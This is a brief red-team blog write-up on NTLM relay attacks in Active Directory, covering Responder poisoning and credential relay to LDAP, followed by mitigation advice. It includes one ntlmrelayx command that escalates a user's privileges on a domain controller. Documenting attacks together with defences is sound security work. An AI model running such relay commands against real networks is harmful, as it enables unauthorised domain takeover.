---
title: "Exploiting NTLM Relay Attacks in AD Environments"
date: 2024-05-20 08:00:00 +0800
categories: [Red Team, Active Directory]
tags: [NTLM Relay, Responder, MitM]
---

## Overview
In this engagement, I abused insecure SMB signing to relay NTLM credentials and gain Domain Admin access.

### Tools Used
- **Responder**: For LLMNR/NBT-NS poisoning.
- **ntlmrelayx.py**: Relayed credentials to LDAP.

![NTLM Relay Diagram]({{ "/assets/img/ntlm-relay.png" | relative_url }})

```bash
python3 ntlmrelayx.py -t ldap://dc01 --escalate-user attacker
```
## Mitigation
- **Enforce SMB signing.**
- **Disable LLMNR/NBT-NS.**

